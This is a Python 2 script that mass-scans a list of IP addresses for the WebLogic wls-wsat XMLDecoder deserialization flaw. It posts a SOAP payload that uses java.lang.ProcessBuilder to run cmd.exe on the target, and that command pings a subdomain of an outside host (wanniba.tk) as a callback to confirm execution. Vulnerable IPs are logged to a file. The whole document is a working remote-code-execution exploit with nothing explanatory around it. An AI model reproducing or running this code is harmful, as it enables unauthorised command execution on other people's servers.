#encoding=utf-8
import requests
import sys
import re
import threading
thread_num =2 
now_step = 0
def exploit(payload,exp):
    try:
        req = requests.post(payload, headers = headers, timeout = 20,data = exp)
        response = req.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception, e:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        result = "test ok"
        ip = re.findall('(?<![\.\d])(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])', payload)
        try:
            open("result.txt", "a").write("%s\n" % (ip))
        except Exception, e:
            print(e)
            return
        print('%s %s' % (result, ip))
    else:
        result = "No Vulnerability"
def show_process(payload,exp):
    exploit(payload,exp)        #开始
    max_arrow = 50
    global now_step
    now_step = now_step + 1
    try:
        sys.stdout.write(' ' * (max_arrow + 9) + '\r')  # 这两句清空缓冲区
        sys.stdout.flush()
    except Exception, e:        
        open("Exception.txt", "a").write("flush buffer error: %s\n" % (e))
    try:
        num_arrow = int(now_step * max_arrow / max_steps)  # 计算显示多少个'>'
        num_line = max_arrow - num_arrow  # 计算显示多少个'-'
        percent = now_step * 100.0 / max_steps  # 计算完成进度，格式为xx.xx%
        process_bar = '[' + '>' * num_arrow + '-' * num_line + ']' \
                    + '%.2f' % percent + '%' + '\r'  # 带输出的字符串，'\r'表示不换行回到最左边
        sys.stdout.write(process_bar)  # 这两句打印字符到终端
        sys.stdout.flush()
    except Exception, e: 
        open("Exception.txt", "a").write("show process error: %s\n" % (e))
#获取IP
def get_ip(ipLog):
    q_ip = []
    try:
        with open(r'{}'.format(ipLog),'r') as f:
            for ip in f:
                ip = ip.strip()
                q_ip.append(ip)
            return q_ip
    except Exception, e:
        open("Exception.txt", "a").write("get ip error: %s\n" % (e))
        print("open ip file {} error".format(ipLog))
        print(e)
        return []
        return q_ip
if __name__ == '__main__':
    iplist = get_ip('win3389.txt')
    max_steps = len(iplist)
    exp1 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
      <soapenv:Header> 
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
          <java> 
            <void class="java.lang.ProcessBuilder"> 
              <array class="java.lang.String" length="3"> 
                <void index="0"> 
                  <string>C:\\Windows\\System32\\cmd.exe</string> 
                </void>  
                <void index="1"> 
                  <string>/c</string> 
                </void>  
                <void index="2"> 
                  <string>ping '''
                  
                  
    exp2 = '''.test.wanniba.tk</string>
                </void> 
              </array>  
              <void method="start"/> 
            </void> 
          </java> 
        </work:WorkContext> 
      </soapenv:Header>  
      <soapenv:Body/> 
    </soapenv:Envelope>'''

    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type':'text/xml',
    }
    threads=[]
    while iplist:
        i = 0
        while i < thread_num and iplist:
            try:
                ip = iplist.pop()
                payload_url = 'http://' + ip + ":8080/wls-wsat/CoordinatorPortType11"
                exp = exp1 + ip + exp2
                t = threading.Thread(target=show_process, args=(payload_url,exp,))
            except Exception, e:
                print(e)
                continue
            threads.append(t)
            t.start()
            i = i + 1
        for t in threads:
            t.join()
